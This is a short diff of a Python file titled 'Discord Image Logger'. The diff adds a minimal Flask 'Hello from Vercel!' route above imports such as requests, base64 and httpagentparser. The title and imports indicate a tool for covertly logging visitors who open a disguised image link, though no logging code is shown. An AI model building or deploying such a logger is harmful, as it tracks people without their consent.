@@ -1,6 +1,14 @@
+
 # Discord Image Logger
 # By DeKrypt | https://github.com/dekrypted
 
+from flask import Flask
+
+app = Flask(__name__)
+
+@app.route("/")
+def home():
+    return "Hello from Vercel!"
 from http.server import BaseHTTPRequestHandler
 from urllib import parse
 import traceback, requests, base64, httpagentparser
